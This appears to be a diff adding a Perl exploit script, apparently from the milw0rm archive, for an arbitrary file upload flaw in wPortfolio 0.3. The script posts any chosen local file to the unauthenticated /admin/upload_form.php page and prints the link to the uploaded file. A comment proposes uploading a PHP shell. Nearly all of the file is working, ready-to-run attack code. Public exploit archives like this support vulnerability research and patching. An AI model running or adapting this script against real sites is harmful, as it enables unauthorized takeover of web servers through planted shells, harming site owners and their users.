@@ -1,0 +1,74 @@
+#!/usr/bin/perl
+
+# Name: wPortfolio <= 0.3 Arbitrary File Upload Exploit
+# Script Name: wPortfolio 0.3
+# Download: http://sourceforge.net/project/downloading.php?group_id=244834&use_mirror=kent&filename=wPortfolio.zip&80791070
+# Vulnerability: Arbitrary File Upload
+# Vulnerable page: /admin/upload_form.php
+# * You can upload everything you want, why not a php shell? ^^
+# Author: Osirys
+# Contact: osirys[at]live[dot]it
+# Proud to be Italian 
+# Thx: athos
+
+use LWP::UserAgent;
+use HTTP::Request::Common;
+
+my $path        = "/admin/upload_form.php";
+my $d_fold      = "/admin/tmp/"; 
+my($host,$file) = ($ARGV[0],$ARGV[1]);
+
+($host,$file) || help("-1");
+cheek($host) == 1 || help("-2");
+&banner;
+my $url = $host.$path;
+
+my $ua = LWP::UserAgent->new;
+my $re = $ua->request(POST $url,
+                      Content_Type => 'form-data',
+                      Content      => [file_to_upload => [$file]] 
+                      );
+
+if ($re->is_success) {
+    print "[+] Uploaded ! \n";
+    print "[+] Link: ".$host.$d_fold.$file." \n";
+}
+else {
+    print "[-] Upload failed ! \n";
+}
+
+sub cheek() {
+    my $host = $_[0];
+    if ($host =~ /http:\/\/(.*)/) {
+        return 1;
+    }
+    else {
+        return 0;
+    }
+}
+
+sub banner {
+    print "\n".
+          "  ========================================== \n".
+          "     wPortfolio 0.3 Arbitrary File Upload \n".
+          "     Author: Osirys \n".
+          "     osirys[at]live[dot]it \n".
+          "     Proud to be italian \n".
+          "  ========================================== \n\n";
+}
+
+sub help() {
+    my $error = $_[0];
+    if ($error == -1) {
+        &banner;
+        print "\n[-] Cheek that you typed the hostname address and the local file to upload !\n";
+    }
+    elsif ($error == -2) {
+        &banner;
+        print "\n[-] Bad hostname address !\n";
+    }
+    print "[*] Usage : perl $0 http://hostname/cms_path local_file_to_upload \n\n";
+    exit(0);
+}
+
+# milw0rm.com [2008-11-19]
